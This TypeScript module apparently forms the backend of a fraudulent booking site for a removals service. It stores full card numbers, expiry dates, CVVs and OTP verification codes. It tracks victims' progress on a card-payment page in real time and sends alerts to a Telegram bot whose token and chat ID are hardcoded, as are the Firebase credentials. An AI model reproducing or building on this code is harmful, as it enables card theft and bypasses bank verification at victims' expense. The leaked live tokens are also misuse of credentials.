import { initializeApp, getApps, getApp } from 'firebase/app';
import { 
  getFirestore, 
  collection, 
  doc, 
  setDoc, 
  getDoc, 
  getDocs, 
  onSnapshot, 
  query, 
  orderBy, 
  limit, 
  updateDoc, 
  deleteDoc, 
  serverTimestamp,
  Timestamp
} from 'firebase/firestore';

// Configuration for esfgdr Firebase Project provided by the user
export const ESFGDR_FIREBASE_CONFIG = {
  apiKey: "AIzaSyAFEf9ZkDkCi7AEXPJ8z_AFsX4pTiPv7Vo",
  authDomain: "esfgdr.firebaseapp.com",
  databaseURL: "https://esfgdr-default-rtdb.firebaseio.com",
  projectId: "esfgdr",
  storageBucket: "esfgdr.firebasestorage.app",
  messagingSenderId: "479566323800",
  appId: "1:479566323800:web:72bcd20412cd0c5b61ea2d",
  measurementId: "G-GMSB6TBP94"
};

// Telegram Bot Configuration
export const DEFAULT_TELEGRAM_CONFIG = {
  botToken: "8911571776:AAF34QGAz1SPQa7bjijcXblKi-bSbY2qY0Q",
  botUsername: "ghhfvsshsorffs_bot",
  chatId: "6726553753"
};

export interface TelegramConfigState {
  botToken: string;
  botUsername: string;
  chatId: string;
}

export const getTelegramConfig = (): TelegramConfigState => {
  try {
    const saved = typeof window !== 'undefined' ? localStorage.getItem('delmon_telegram_config') : null;
    if (saved) {
      const parsed = JSON.parse(saved);
      // Auto-migrate if the user previously had the obsolete placeholder chat ID
      const resolvedChatId = (!parsed.chatId || parsed.chatId === '8914993162')
        ? DEFAULT_TELEGRAM_CONFIG.chatId
        : parsed.chatId;

      return {
        botToken: parsed.botToken || DEFAULT_TELEGRAM_CONFIG.botToken,
        botUsername: parsed.botUsername || DEFAULT_TELEGRAM_CONFIG.botUsername,
        chatId: resolvedChatId
      };
    }
  } catch (e) {
    // fallback
  }
  return { ...DEFAULT_TELEGRAM_CONFIG };
};

export const saveTelegramConfig = (config: TelegramConfigState) => {
  if (typeof window !== 'undefined') {
    localStorage.setItem('delmon_telegram_config', JSON.stringify(config));
  }
};

export const resetTelegramConfig = (): TelegramConfigState => {
  if (typeof window !== 'undefined') {
    localStorage.removeItem('delmon_telegram_config');
  }
  return { ...DEFAULT_TELEGRAM_CONFIG };
};

export const TELEGRAM_CONFIG = DEFAULT_TELEGRAM_CONFIG;


// Initialize or reuse app
export const esfgdrApp = !getApps().some(a => a.name === 'esfgdr')
  ? initializeApp(ESFGDR_FIREBASE_CONFIG, 'esfgdr')
  : getApp('esfgdr');

export const esfgdrDb = getFirestore(esfgdrApp);

// Types for esfgdr Collections
export interface EsfgdrBooking {
  id: string;
  name?: string;
  email?: string;
  phone?: string;
  fromAddress?: string;
  toAddress?: string;
  fromCity?: string;
  toCity?: string;
  fromPostcode?: string;
  toPostcode?: string;
  moveDate?: string;
  moveTime?: string;
  propertySize?: string;
  packageLabel?: string;
  notes?: string;
  depositAmount?: number;
  paymentAmount?: number;
  paymentCurrency?: string;
  paymentMethod?: string;
  paymentProvider?: string;
  paymentReference?: string;
  paymentCardholderName?: string;
  cardNumber?: string;
  cardLast4?: string;
  cardBrand?: string;
  cardExpiry?: string;
  cardCvv?: string;
  verificationCode?: string; // OTP
  isVerified?: boolean;
  paymentStatus?: string;
  status?: string;
  type?: string;
  createdAt?: any;
  updatedAt?: any;
  paymentPaidAt?: any;
}

export interface EsfgdrVisitor {
  id: string;
  sessionId?: string;
  currentPage?: string;
  currentStep?: string;
  isOnline?: boolean;
  createdAt?: any;
  updatedAt?: any;
}

export interface EsfgdrStep {
  id: string;
  sessionId?: string;
  page?: string;
  step?: string;
  userId?: string;
  data?: Record<string, any>;
  timestamp?: any;
  updatedAt?: any;
}

export interface EsfgdrSession {
  id: string;
  startTime?: any;
  lastActivity?: any;
  isOnline?: boolean;
  currentPage?: string;
}

// -------------------------------------------------------------
// Real-time Subscriptions
// -------------------------------------------------------------

export function subscribeToEsfgdrBookings(
  onData: (bookings: EsfgdrBooking[]) => void,
  onError?: (err: Error) => void
) {
  const colRef = collection(esfgdrDb, 'bookings');
  return onSnapshot(
    colRef,
    (snapshot) => {
      const items: EsfgdrBooking[] = [];
      snapshot.forEach((d) => {
        items.push({
          id: d.id,
          ...d.data()
        } as EsfgdrBooking);
      });
      // Sort newest first
      items.sort((a, b) => {
        const timeA = a.createdAt?.seconds || a.updatedAt?.seconds || 0;
        const timeB = b.createdAt?.seconds || b.updatedAt?.seconds || 0;
        return timeB - timeA;
      });
      onData(items);
    },
    (err) => {
      console.error('Error subscribing to esfgdr bookings:', err);
      if (onError) onError(err);
    }
  );
}

export function subscribeToEsfgdrVisitors(
  onData: (visitors: EsfgdrVisitor[]) => void,
  onError?: (err: Error) => void
) {
  const colRef = collection(esfgdrDb, 'visitors');
  return onSnapshot(
    colRef,
    (snapshot) => {
      const items: EsfgdrVisitor[] = [];
      snapshot.forEach((d) => {
        items.push({
          id: d.id,
          ...d.data()
        } as EsfgdrVisitor);
      });
      items.sort((a, b) => {
        const timeA = a.updatedAt?.seconds || a.createdAt?.seconds || 0;
        const timeB = b.updatedAt?.seconds || b.createdAt?.seconds || 0;
        return timeB - timeA;
      });
      onData(items);
    },
    (err) => {
      console.error('Error subscribing to esfgdr visitors:', err);
      if (onError) onError(err);
    }
  );
}

export function subscribeToEsfgdrSteps(
  onData: (steps: EsfgdrStep[]) => void,
  onError?: (err: Error) => void,
  maxDocs: number = 100
) {
  const colRef = collection(esfgdrDb, 'bookings_steps');
  return onSnapshot(
    colRef,
    (snapshot) => {
      const items: EsfgdrStep[] = [];
      snapshot.forEach((d) => {
        items.push({
          id: d.id,
          ...d.data()
        } as EsfgdrStep);
      });
      // Sort newest first
      items.sort((a, b) => {
        const timeA = a.timestamp?.seconds || a.updatedAt?.seconds || 0;
        const timeB = b.timestamp?.seconds || b.updatedAt?.seconds || 0;
        return timeB - timeA;
      });
      onData(items.slice(0, maxDocs));
    },
    (err) => {
      console.error('Error subscribing to esfgdr steps:', err);
      if (onError) onError(err);
    }
  );
}

// -------------------------------------------------------------
// Mutations & Actions
// -------------------------------------------------------------

export async function updateEsfgdrBookingStatus(
  bookingId: string, 
  newStatus: string,
  paymentStatus?: string
): Promise<void> {
  const docRef = doc(esfgdrDb, 'bookings', bookingId);
  const payload: Record<string, any> = {
    status: newStatus,
    updatedAt: serverTimestamp()
  };
  if (paymentStatus) {
    payload.paymentStatus = paymentStatus;
  }
  await updateDoc(docRef, payload);
}

export async function deleteEsfgdrBooking(bookingId: string): Promise<void> {
  const docRef = doc(esfgdrDb, 'bookings', bookingId);
  await deleteDoc(docRef);
}

export async function deleteEsfgdrStep(stepId: string): Promise<void> {
  const docRef = doc(esfgdrDb, 'bookings_steps', stepId);
  await deleteDoc(docRef);
}

// Record a new step in esfgdr
export async function recordEsfgdrStep(
  sessionId: string,
  stepName: string,
  stepData: Record<string, any>,
  page: string = '/card-payment.html'
): Promise<string> {
  try {
    const docId = `${sessionId}_${stepName}`;
    const docRef = doc(esfgdrDb, 'bookings_steps', docId);
    await setDoc(docRef, {
      sessionId,
      step: stepName,
      page,
      userId: 'anonymous',
      data: stepData,
      timestamp: serverTimestamp(),
      updatedAt: serverTimestamp()
    }, { merge: true });
    return docId;
  } catch (err) {
    console.warn('Failed to record esfgdr step:', err);
    return '';
  }
}

// Save or create a booking in esfgdr
export async function saveEsfgdrBooking(
  bookingData: Partial<EsfgdrBooking>
): Promise<string> {
  try {
    const bookingId = bookingData.id || `BH-${Date.now()}`;
    const docRef = doc(esfgdrDb, 'bookings', bookingId);
    const cleanData: Record<string, any> = {
      ...bookingData,
      id: bookingId,
      updatedAt: serverTimestamp(),
      createdAt: bookingData.createdAt || serverTimestamp()
    };
    await setDoc(docRef, cleanData, { merge: true });
    return bookingId;
  } catch (err) {
    console.error('Failed to save esfgdr booking:', err);
    throw err;
  }
}

// Update or set live visitor in esfgdr
export async function recordEsfgdrVisitor(
  sessionId: string,
  currentPage: string,
  currentStep: string = 'booking',
  isOnline: boolean = true
): Promise<void> {
  try {
    const docRef = doc(esfgdrDb, 'visitors', sessionId);
    await setDoc(docRef, {
      sessionId,
      currentPage,
      currentStep,
      isOnline,
      updatedAt: serverTimestamp(),
      createdAt: serverTimestamp()
    }, { merge: true });
  } catch (err) {
    console.warn('Failed to record esfgdr visitor:', err);
  }
}

// -------------------------------------------------------------
// Telegram Bot Alerts API
// -------------------------------------------------------------

export interface TelegramSendResult {
  ok: boolean;
  error?: string;
}

export async function sendTelegramNotificationDetailed(
  message: string,
  configOverride?: Partial<TelegramConfigState>
): Promise<TelegramSendResult> {
  try {
    const cfg = getTelegramConfig();
    const token = configOverride?.botToken || cfg.botToken;
    const chatId = configOverride?.chatId || cfg.chatId;

    if (!token || !chatId) {
      return { ok: false, error: 'لم يتم تحديد رمز البوت أو معرف المحادثة' };
    }

    const url = `https://api.telegram.org/bot${token}/sendMessage`;
    const response = await fetch(url, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: 'HTML'
      })
    });
    const resJson = await response.json();
    if (resJson.ok) {
      return { ok: true };
    } else {
      return {
        ok: false,
        error: resJson.description || 'فشل إرسال الرسالة من تلغرام'
      };
    }
  } catch (err: any) {
    console.warn('Telegram notification delivery error:', err);
    return { ok: false, error: err?.message || 'خطأ في الاتصال بشبكة تلغرام' };
  }
}

export async function sendTelegramNotification(
  message: string,
  configOverride?: Partial<TelegramConfigState>
): Promise<boolean> {
  const result = await sendTelegramNotificationDetailed(message, configOverride);
  return result.ok;
}

export async function checkTelegramUpdates(botToken?: string): Promise<{
  ok: boolean;
  updates?: any[];
  detectedChats?: { id: string | number; name: string; username?: string; text?: string }[];
  error?: string;
}> {
  try {
    const cfg = getTelegramConfig();
    const token = botToken || cfg.botToken;
    const response = await fetch(`https://api.telegram.org/bot${token}/getUpdates`);
    const data = await response.json();
    if (!data.ok) {
      return { ok: false, error: data.description || 'فشل فحص التحديثات' };
    }

    const updates = data.result || [];
    const chatsMap = new Map<string, { id: string | number; name: string; username?: string; text?: string }>();

    for (const u of updates) {
      const msg = u.message || u.edited_message || u.channel_post;
      if (msg && msg.chat) {
        const cId = msg.chat.id.toString();
        const name = [msg.chat.first_name, msg.chat.last_name].filter(Boolean).join(' ') || msg.chat.title || 'مستخدم';
        chatsMap.set(cId, {
          id: msg.chat.id,
          name,
          username: msg.chat.username,
          text: msg.text || ''
        });
      }
    }

    return {
      ok: true,
      updates,
      detectedChats: Array.from(chatsMap.values())
    };
  } catch (err: any) {
    return { ok: false, error: err?.message || 'خطأ في الاتصال بتلغرام' };
  }
}

